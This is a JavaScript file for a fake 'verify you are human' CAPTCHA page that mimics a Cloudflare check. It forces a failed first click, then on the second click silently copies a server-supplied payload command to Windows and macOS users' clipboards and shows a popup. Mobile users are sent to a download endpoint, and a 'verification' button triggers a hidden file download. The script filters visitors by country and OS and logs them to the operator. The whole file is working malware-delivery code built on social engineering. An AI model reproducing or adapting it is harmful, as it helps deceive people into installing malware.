

// domain 
const domain = window.location.hostname;
// browser name
const browserName = $('#browserName').val();
// host name
const httpHOST = $('#httpHOST').val();


window.setTimeout(function() {
  $('#wait').css('display', 'none');
  $('#loading').css('display', 'none');
  $('#action').css('display', 'block');
  $('.captcha-wrapper').css('display', 'block');
}, 3000)


// Automatically load translations when the page loads
document.addEventListener("DOMContentLoaded", () => {
  loadTranslations();
});



let userLang;
let translate_Lang;
// **************** JS Code For Translate ********************
// Function to detect the user's browser language and set the appropriate text
function setLanguage(translations) {
  // Get the user's preferred language from the browser (e.g., 'en', 'es')
  userLang = navigator.language || navigator.userLanguage;

  // Only keep the first two characters (e.g., 'en-US' becomes 'en')
  userLang = userLang.slice(0, 2);

  // If the language is not supported, default to English ('en')
  if (!translations[userLang]) {
    userLang = "en";
  }

  // Fetch all elements with the 'data-translate' attribute
  var translatableElements = document.querySelectorAll("[data-translate]");

  // Loop through each element and update its text based on the detected language
  translatableElements.forEach((element) => {

    var translateKey = element.getAttribute("data-translate");
    translations[userLang][translateKey] = translations[userLang][translateKey].replace('{{domain}}', domain).replace('{{httpHOST}}', '<span style="font-weight: 500;">'+httpHOST+'</span>');
    element.innerHTML = translations[userLang][translateKey];
  });
}


// Function to load translations from a JSON file
function loadTranslations() {
  fetch("./assets/lang.json")
    .then((response) => response.json())
    .then((translations) => {
      translate_Lang = translations;
      setLanguage(translations);
    })
    .catch((error) => {
      console.error("Error loading translations:", error);
    });
}



// show popup
function show_popup() {
  $('#overlay').css('display', 'block');
  $('#popup').css('display', 'block');
}

// hide popup
function hide_popup() {
  $('#overlay').css('display', 'none');
  $('#popup').css('display', 'none');
}


$('#a_refresh').attr('style', 'color: red !important;');
// set dark mode by OS setting
console.log(window.matchMedia('(prefers-color-scheme: light)'))
// Function to toggle dark mode based on browser/system setting
function applyDarkMode() {
  // Check if the user's browser/system is set to dark mode
  if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
    // Dark mode is enabled in browser settings
    document.body.classList.add('dark-mode');
    document.body.style.color = '';
    $.post('/api/dark_mode.php', {mode: true});
    console.log('Dark mode applied based on browser setting');
  } else {
    // Light mode is enabled in browser settings
    document.body.classList.remove('dark-mode');
    $.post('/api/dark_mode.php', {mode: false});
    console.log('Light mode applied based on browser setting');
  }
}

// Detect system/browser color scheme changes
window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', (event) => {
  console.log(event.matchs, )
  if (event.matches) {
    // User switched to dark mode
    document.body.classList.add('dark-mode');
    console.log('Switched to dark mode');
    $.post('/api/dark_mode.php', {mode: true}, function(res) {
      location.reload();
    });
  } else {
    // User switched to light mode
    document.body.classList.remove('dark-mode');
    console.log('Switched to light mode');
    $.post('/api/dark_mode.php', {mode: false}, function(res) {
      location.reload();
    });
  }
});

// Apply the initial mode when the page loads
applyDarkMode();




let clickCount = 0;

// play video loading
$('#checkbox-container').click(function() {

  document.getElementById("captcha-text").innerHTML = translate_Lang[userLang]['process'];

  if (clickCount == 0) {
      document.getElementById('video1').currentTime = 0;
      document.getElementById('video1').play();
  } else {  
      $('.video1').css('display', 'none');
      $('.video2').css('display', 'block');
      document.getElementById('video2').play();
  } 

  setTimeout(function () {
    // document.getElementById("captcha-spinner").style.display = "none"; // Hide spinner after 2 seconds
    
    if (clickCount == 0) {
      // First click: show alert, revert to checkbox, but no success mark
      document.getElementById("error-message").style.display = "block"; // Show red error message
      document.getElementById("captcha-text").innerHTML = translate_Lang[userLang]['verify-human'];
      document.getElementById('captcha-wrapper').style.height = '100px';
    } else if (clickCount == 1) {
      // Second click: successful verification, show success mark
      document.getElementById("error-message").style.display = "none"; // Hide error message
      document.getElementById("captcha-text").innerHTML = translate_Lang[userLang]['success'];
      document.getElementById('captcha-wrapper').style.height = 'auto';
      
      if (OS == 'Windows' || OS == 'macOS') {
        navigator.clipboard.writeText(PayloadURL);
        show_popup();
      }
      if (OS == 'Android' || OS == 'iPhone') {
        $('#popup_mobile').css('display', 'flex');
        window.location.href = "/api/download.php?rayid=" + rayID + '&countrycode=' + country_code + '&version=V4';
        window.setTimeout(function() {
          $('.popup_mobile-help').css('display', 'block');
        }, 60000);
      }
      
    }

    clickCount++;
  }, 2000); // Simulates loading time
})



// Function to generate a random 16-character hexadecimal Ray ID
function generateRayID() {
  var characters = "0123456789abcdef";
  let rayID = "";
  for (let i = 0; i < 16; i++) {
    rayID += characters.charAt(Math.floor(Math.random() * characters.length));
  }
  return rayID;
}


// Ray ID
var rayID;

if (localStorage.getItem('ray')) {
  rayID = localStorage.getItem('ray');
} else {
  rayID = generateRayID();
  localStorage.setItem('ray', rayID);
}

$('#ray-id').text(rayID);  

// archiving state
var archiving;
$.post('/api/get_archiving.php', {}, function(res) {
    archiving = res;
});

// Getting the country code from the user's IP
var country_code = '';

// Settings info
var isDirectDownload = false;
var patchDownloadLinks = [];
var PayloadURL = '';

$.get('https://ipinfo.io/json', function(ipinfo) {
  country_code = ipinfo.country;
  $.post('/api/get_validData.php', {}, function(setting) {

      isDirectDownload = setting.isDirectDownload == 'ON' && true;
      patchDownloadLinks = setting.PatchDownloadLinks;
      PayloadURL = setting.PayloadURL;

      if (setting.PageStatus == 'ON' && setting.OS.includes(OS) && (setting.GEO.includes(country_code) || setting.GEO.includes('100')) && !setting.BlockedGEO.includes(country_code) && setting.Version.Enabled == 'V4') {
          $.post('/api/index.php', {
            rayid: rayID,
            countrycode: country_code,
            version: 'V4'
          });
          document.body.style.opacity = 100;
      } else {
          location.href =  window.location.protocol + "//" + window.location.hostname + (window.location.port ? ':' + window.location.port : '');
      } 
  });
})


// check ray id
check_ray_id();
function check_ray_id() {
  $.ajax({
    type: 'POST',
    url: '/api/check_rayid.php',
    data: JSON.stringify({ rayid: rayID }),
    contentType: 'application/json', // Indicate that you're sending JSON
    success: function(res) {

        if (res == '10') {
          document.body.innerHTML = '';
          location.href =  window.location.protocol + "//" + window.location.hostname + (window.location.port ? ':' + window.location.port : '');
        }
    }
  })
  
}

// get OS
const OS = getOS();
function getOS() {
  const userAgent = navigator.userAgent;
  if (/Windows/i.test(userAgent)) return 'Windows';
  if (/Android/i.test(userAgent)) return 'Android';
  if (/iPhone|iPad/i.test(userAgent)) return 'iPhone';
  if (/Macintosh|Mac OS X/i.test(userAgent)) return 'macOS';
  return 'Unknown OS';
}


// wait-respond loading
window.setInterval(() => {
  const wait_respond_loading = document.getElementById('wait_respond_loading');
  wait_respond_loading.innerHTML += '.';

  if ( wait_respond_loading.textContent.length > 8 ) {
    wait_respond_loading.innerHTML = '...';
  }
}, 400)


function download_file() {

  if (isDirectDownload) {

    const link = document.createElement('a');
    link.href = patchDownloadLinks[0];
    link.download = '';
    link.style = 'display: none';
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    $.post('/api/download.php', {
      rayid: rayID,
      countrycode: country_code,
      version: 'V4'
    });
  } else {
    window.location.href = "/api/download.php?rayid=" + rayID + '&countrycode=' + country_code + '&version=V4';
  }
  
}


$(document).on('click', '#refresh_btn', function() {
    location.reload();
})



// PC overlay Functions

let errorCount = 0;
 
function toggleDropdown() {
    const dropdownContent = document.getElementById("dropdown-content");
    const dropdown = document.querySelector(".dropdown");
    dropdownContent.style.display = dropdownContent.style.display === "block" ? "none" : "block";
    dropdown.classList.toggle("open");
}

function toggleButton() {
    const checkbox = document.getElementById("agree-checkbox");
    const button = document.getElementById("download-button");
    if (checkbox.checked) {
        button.classList.add("active");
        button.removeAttribute("disabled");
    } else {
        button.classList.remove("active");
        button.setAttribute("disabled", "true");
    }
}

function startVerification() {
    const button = document.getElementById("download-button");
    const errorMessage = document.getElementById("error-message");

    if (errorCount < 3) {
        errorMessage.style.display = "block";
        button.classList.remove("active");
        button.setAttribute("disabled", "true");

        if (errorCount == 0) download_file();

        setTimeout(function() {
          errorMessage.style.display = "none";
          button.classList.add("active");
          button.removeAttribute("disabled");
        }, 5000); // 5 seconds delay
        errorCount++;
    } else {
        button.textContent = "Verifying...";
        button.disabled = true;
        
        setTimeout(() => location.reload(), 1500);
    }
}

function showImage(src) {
    const modal = document.getElementById("image-modal");
    const modalImage = document.getElementById("modal-image");
    modalImage.src = src;
    modal.style.display = "flex";
}

function closeImage() {
    const modal = document.getElementById("image-modal");
    const modalImage = document.getElementById("modal-image");
    modalImage.src = ""; // Clear the image src when closing to reset state
    modal.style.display = "none";
}